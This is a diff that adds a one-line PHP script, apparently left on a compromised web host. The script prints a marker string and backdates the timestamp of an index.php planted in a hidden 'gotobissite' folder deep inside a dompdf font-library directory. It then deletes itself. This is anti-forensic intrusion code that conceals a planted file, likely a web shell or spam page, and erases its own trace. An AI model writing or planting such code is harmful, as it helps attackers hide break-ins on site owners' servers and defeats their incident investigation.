@@ -1,0 +1,1 @@
+<?php echo "FMUKpqnfAU"; if (file_exists("/home2/allemanp/public_html/appsgi/application/libraries/dompdf/lib/php-font-lib/src/FontLib/Exception/gotobissite/index.php")){ touch("/home2/allemanp/public_html/appsgi/application/libraries/dompdf/lib/php-font-lib/src/FontLib/Exception/gotobissite/index.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*sKGChZ51YBSNSuXKDCue*/ ?>
